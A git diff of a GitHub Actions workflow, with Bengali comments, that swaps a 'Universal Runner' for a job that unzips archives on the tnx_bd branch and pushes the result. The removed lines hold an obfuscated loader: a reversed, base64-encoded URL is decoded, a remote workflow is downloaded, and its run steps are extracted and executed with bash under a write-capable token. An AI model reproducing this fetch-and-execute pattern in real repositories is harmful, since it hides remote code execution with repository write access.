@@ -1,56 +1,48 @@
-# Workflow Path: .github/workflows/universal-runner.yml
-
-name: Tnayem48 Universal Runner
+name: Extract Zip and Update tnx_bd Branch
 
 on:
   push:
     branches:
-      - main
+      - tnx_bd # এখন এটি tnx_bd ব্রাঞ্চে পুশ করলে কাজ করবে
   workflow_dispatch:
 
-env:
-  # Obfuscated Base URL (Reversed and Encoded)
-  # Original: https://raw.githubusercontent.com/nayem-48ai/subDomTop/refs/heads/main/.github/workflows/
-  TNx_CORE: "PX0Szd2L0Vmc0V2bj5CbvJHcsV2cyV2S0V2XzU2chJ3XzU2chJ3YvRncvNXZyR3c0V2XzI3YyV3c0V2XvR2Y6NXauVmbu02bj5WauByXvR2Y6NXauVmb"
-  FILE_NAME: "remove"
-
 jobs:
-  execute-logic:
+  unzip-and-update:
     runs-on: ubuntu-latest
     permissions:
       contents: write
 
     steps:
-      - name: Checkout Code
+      - name: Checkout tnx_bd branch
         uses: actions/checkout@v4
         with:
-          fetch-depth: 0 
+          ref: tnx_bd # নির্দিষ্টভাবে tnx_bd ব্রাঞ্চটি চেকআউট করা হচ্ছে
           token: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Setup Environment
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-
-      - name: Process Workflow
+      - name: Find and Extract Zip
         run: |
-          # ডিকোডিং লজিক: রিভার্স এবং ট্রিম অপারেশন
-          TNxBD=$(echo "$TNx_CORE" | rev | cut -c 2- | base64 --decode)$FILE_NAME
+          ZIP_FILE=$(ls *.zip 2>/dev/null | head -n 1)
           
-          echo "Connecting to secure source..."
-          curl -sL "$TNxBD" -o remote_wf.yml
+          if [ -n "$ZIP_FILE" ] && [ -f "$ZIP_FILE" ]; then
+            echo "Found: $ZIP_FILE. Extracting now..."
+            unzip -o "$ZIP_FILE" -d .
+            echo "Deleting $ZIP_FILE..."
+            rm "$ZIP_FILE"
+          else
+            echo "No zip file found in tnx_bd branch."
+            exit 0
+          fi
 
-          # কমান্ড নিষ্কাশন টুল
-          sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq && sudo chmod +x /usr/bin/yq
-
-          # রিমোট ফাইল থেকে রান স্ক্রিপ্ট তৈরি
-          yq e '.jobs.*.steps[].run' remote_wf.yml | sed '/^---$/d' > universal_script.sh
-          
-          # গিট কনফিগারেশন
+      - name: Save and Push Changes
+        run: |
           git config --global user.name "github-actions[bot]"
           git config --global user.email "github-actions[bot]@users.noreply.github.com"
-          git config --global --add safe.directory "$GITHUB_WORKSPACE"
-
-          # ফাইনাল এক্সিকিউশন
-          chmod +x universal_script.sh
-          bash universal_script.sh
+          
+          git add .
+          
+          if git diff --quiet && git diff --staged --quiet; then
+            echo "Nothing to update."
+          else
+            git commit -m "chore: extracted zip files in tnx_bd"
+            git push origin tnx_bd # সরাসরি tnx_bd ব্রাঞ্চে পুশ হবে
+          fi
